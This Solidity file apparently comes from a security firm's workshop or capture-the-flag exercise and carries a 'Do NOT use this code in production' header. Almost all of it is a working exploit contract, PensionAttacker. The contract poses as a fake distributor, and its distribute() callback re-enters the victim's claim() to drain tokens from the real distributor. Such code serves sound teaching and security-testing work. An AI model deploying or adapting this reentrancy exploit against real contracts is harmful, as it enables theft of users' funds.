// SPDX-License-Identifier: GPL-3.0
/**  Do NOT use this code in production **
    _    _           _ _             
   | |  | |         (_) |            
   | |  | |___  ____ _| | ___   ____ 
    \ \/ / _  )/ ___) | |/ _ \ / _  |
     \  ( (/ /| |   | | | |_| ( ( | |
    _ \/ \____)_|   |_|_|\___/ \_|| |
   | |        | |      _      (_____|
    \ \   ___ | |_   _| |_ (_) ___  ____   ___ 
     \ \ / _ \| | | | |  _)| |/ _ \|  _ \ /___)
 _____) ) |_| | | |_| | |__| | |_| | | | |___ |
(______/ \___/|_|\____|\___)_|\___/|_| |_(___/ 
                                               
Verilog Solutions Inc. https://www.verilog.solutions
Verilog is a full-stack web3 security firm, covering smart contract auditing, 
validator operations, venture investment, and incubation.
Glad to prepare and present the materials for Game Day Remix in DevConnect Amsterdam!
*/

pragma solidity ^0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./interface/IPensionDistributor.sol";
import "./interface/IPensionToken.sol";
import "./interface/IPensionVictim.sol";

contract PensionAttacker is IPensionDistributor{
    IPensionToken token;
    IPensionVictim victim;
    IPensionDistributor distributor;

    constructor(IPensionVictim victim_address, IPensionToken token_address, IPensionDistributor distributor_address) {
        victim = victim_address;
        token = token_address;
        distributor = distributor_address;
    }

    function attack(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        token.increaseAllowance(address(victim), amount);
        victim.deposit(amount);
        victim.claim(IPensionDistributor(address(this)), address(this));
    }

    /// @notice oh~hh this is not the real distribute() function!
    function distribute(address recipient, uint256 amount)
        external
        override
    {
        // mute warnings
        recipient;amount;
        if (msg.sender != address(victim)){
            revert("Attacker:: Not the target.");
        }
        if (token.balanceOf(address(distributor)) > 10 ** 18){
            victim.claim(distributor, address(this));
            victim.claim(IPensionDistributor(address(this)), address(this));
        }

    }
}
